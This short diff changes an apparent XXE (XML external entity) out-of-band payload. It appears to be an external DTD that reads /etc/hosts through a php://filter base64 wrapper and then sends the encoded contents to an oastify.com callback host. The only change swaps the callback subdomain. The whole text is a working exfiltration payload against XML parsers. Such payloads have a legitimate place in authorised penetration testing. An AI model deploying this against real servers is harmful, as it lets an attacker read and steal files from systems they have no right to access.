@@ -1,2 +1,2 @@
 <!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/hosts">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://pa3firadm5ods87tc4t74cudw42vq0ep.oastify.com/endpoint.php?a=%d;'>">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://s81igu8gk8mgqb5wa7ra2fsgu70yopfd4.oastify.com/endpoint.php?a=%d;'>">
